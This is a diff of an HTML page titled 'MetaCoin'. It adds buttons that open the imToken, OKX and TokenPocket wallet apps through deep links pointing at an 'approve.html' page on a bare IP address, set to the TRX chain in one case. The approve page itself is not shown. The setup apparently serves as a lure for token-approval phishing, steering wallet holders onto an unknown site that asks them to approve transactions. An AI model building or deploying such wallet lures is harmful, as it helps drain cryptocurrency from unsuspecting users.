@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
     <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
     <title>MetaCoin</title>
 
-    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/bootstrap.min.css" rel="stylesheet" />
 
     <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
     <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
@@ -15,15 +15,56 @@
       <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
       <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
     <![endif]-->
+    <style>
+      button {
+        width: 200px;
+        height: 50px;
+        margin: 20px;
+      }
+    </style>
   </head>
   <body>
     <div class="container">
-      <!--  要编码下url参数 -->
-      <a href="imtokenv2://navigate/DappView?url=http://10.220.40.96/approve.html">打开 imToken</a> 
+      <div>
+        <button class="imtoken">打开 imToken</button>
+      </div>
+      <div>
+        <button class="okx">打开 okx</button>
+      </div>
+      <div>
+        <button class="tp">打开 tp</button>
+      </div>
     </div>
     <script src="js/jquery-2.1.4.min.js"></script>
     <script src="js/bootstrap.min.js"></script>
     <script src="js/tronweb.js"></script>
     <script src="js/metacoin-config.js"></script>
+    <script>
+      // 此处填要跳转的httpsd地址
+      const redirectUrl = 'http://111.229.86.134:9003/approve.html';
+      // 点击imtoken按钮，打开
+      $('.imtoken').click(() => {
+        window.open(
+          'imtokenv2://navigate/DappView?url=' + encodeURIComponent(redirectUrl)
+        );
+      });
+      // 点击okx按钮，打开
+      $('.okx').click(() => {
+        window.open(
+          'okx://wallet/dapp/details?dappUrl=' + encodeURIComponent(redirectUrl)
+        );
+      });
+      // 点击tp按钮，打开
+      $('.tp').click(() => {
+        const params = {
+          url: redirectUrl, // 跳转地址
+          chain: 'TRX', // 链波卡
+          source: '', // 来源任意
+        };
+        window.open(
+          'tpdapp://open?params=' + encodeURIComponent(JSON.stringify(params))
+        );
+      });
+    </script>
   </body>
 </html>
